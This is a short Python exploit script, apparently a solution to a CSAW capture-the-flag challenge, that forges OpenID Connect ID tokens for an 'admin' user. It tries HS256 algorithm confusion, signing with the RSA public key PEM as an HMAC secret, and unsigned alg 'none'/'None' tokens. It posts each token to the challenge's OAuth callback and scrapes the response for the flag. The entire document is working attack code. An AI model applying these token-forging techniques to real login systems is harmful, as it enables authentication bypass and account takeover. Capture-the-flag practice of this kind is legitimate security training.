import base64,json,hmac,hashlib,requests,sys
B="https://dino2auth.ctf.csaw.io"
def b64u(b):
    if isinstance(b,str): b=b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()
pub=open("paleo_pub.pem","rb").read()
iss="paleoid.example.com"; sub=sys.argv[1] if len(sys.argv)>1 else "admin"

def submit(tok,label):
    s=requests.Session()
    r=s.post(f"{B}/oauth/callback",data={"id_token":tok,"state":"x"},allow_redirects=False)
    who="?"
    if r.status_code in (302,303):
        h=s.get(f"{B}/").text
        for line in h.splitlines():
            if "via " in line or "Flagosaurus" in line and "admin" in line.lower():
                pass
        import re
        m=re.search(r'nav-link">([^<]*via[^<]*)<',h)
        who=m.group(1) if m else ""
        flag="csawctf{" in h
        adminline = "Not an admin account" not in h
        print(f"[{label}] {r.status_code} who='{who}' notAdmin_removed={adminline} flagpresent={flag}")
        if flag:
            import re
            print(re.search(r'csawctf\{[^}]+\}',h).group())
    else:
        print(f"[{label}] {r.status_code} rejected")

payload={"iss":iss,"sub":sub,"aud":"trustdinoidc-portal","scope":"openid profile freeosaurus:redeem","exp":1900000000}
# 1) HS256 with pubkey PEM as secret
for secret,name in [(pub,"HS256-pubPEM"),(pub.strip(),"HS256-pubPEMstrip")]:
    header={"alg":"HS256","typ":"JWT"}
    signing=f"{b64u(json.dumps(header))}.{b64u(json.dumps(payload))}"
    sig=hmac.new(secret,signing.encode(),hashlib.sha256).digest()
    submit(f"{signing}.{b64u(sig)}",name)
# 2) alg=none
for h in [{"alg":"none","typ":"JWT"},{"alg":"None","typ":"JWT"}]:
    signing=f"{b64u(json.dumps(h))}.{b64u(json.dumps(payload))}"
    submit(f"{signing}.",h["alg"])
